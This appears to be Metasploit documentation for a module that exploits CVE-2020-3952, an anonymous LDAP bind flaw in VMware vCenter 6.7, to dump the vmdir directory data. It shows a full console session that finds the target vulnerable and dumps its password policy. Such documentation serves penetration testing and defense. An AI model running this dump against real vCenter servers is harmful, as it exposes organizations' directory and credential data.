## Vulnerable Application

### Description

This module uses an anonymous-bind LDAP connection to dump data from
the vmdir service in VMware vCenter Server version 6.7 prior to the
6.7U3f update.

### Setup

Tested in the wild. No setup notes available at this time, as setup will
be specific to target environment.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Actions

### Dump

Dump all LDAP data from the vCenter Server.

## Options

### BASE_DN

If you already have the LDAP base DN, you may set it in this option.

### ConnectTimeout

You may configure the timeout for LDAP connects if necessary. The
default is 10.0 seconds and should be more than sufficient.

## Scenarios

### VMware vCenter Server 6.7 virtual appliance on ESXi

```
msf5 > use auxiliary/gather/vmware_vcenter_vmdir_ldap
msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > options

Module options (auxiliary/gather/vmware_vcenter_vmdir_ldap):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   BASE_DN                   no        LDAP base DN if you already have it
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    389              yes       The target port


Auxiliary action:

   Name  Description
   ----  -----------
   Dump  Dump all LDAP data


msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > set rhosts [redacted]
rhosts => [redacted]
msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) > run
[*] Running module against [redacted]

[*] Discovering base DN automatically
[*] Searching root DSE for base DN
dn: cn=DSE Root
namingcontexts: dc=vsphere,dc=local
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.1
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.2
supportedcontrol: 1.3.6.1.4.1.4203.1.9.1.3
supportedcontrol: 1.2.840.113556.1.4.417
supportedcontrol: 1.2.840.113556.1.4.319
supportedldapversion: 3
supportedsaslmechanisms: GSSAPI

[+] Discovered base DN: dc=vsphere,dc=local
[*] Dumping LDAP data from vmdir service at [redacted]:389
[+] [redacted]:389 is vulnerable to CVE-2020-3952
[*] Storing LDAP data in loot
[+] Saved LDAP data to /Users/wvu/.msf4/loot/20200417002613_default_[redacted]_VMwarevCenterS_939568.txt
[*] Password and lockout policy:
dn: cn=password and lockout policy,dc=vsphere,dc=local
cn: password and lockout policy
enabled: TRUE
ntsecuritydescriptor:: [redacted]
objectclass: top
objectclass: vmwLockoutPolicy
objectclass: vmwPasswordPolicy
objectclass: vmwPolicy
vmwpasswordchangeautounlockintervalsec: [redacted]
vmwpasswordchangefailedattemptintervalsec: [redacted]
vmwpasswordchangemaxfailedattempts: [redacted]
vmwpasswordlifetimedays: [redacted]
vmwpasswordmaxidenticaladjacentchars: [redacted]
vmwpasswordmaxlength: [redacted]
vmwpasswordminalphabeticcount: [redacted]
vmwpasswordminlength: [redacted]
vmwpasswordminlowercasecount: [redacted]
vmwpasswordminnumericcount: [redacted]
vmwpasswordminspecialcharcount: [redacted]
vmwpasswordminuppercasecount: [redacted]
vmwpasswordprohibitedpreviouscount: [redacted]

[*] Auxiliary module execution completed
msf5 auxiliary(gather/vmware_vcenter_vmdir_ldap) >
```
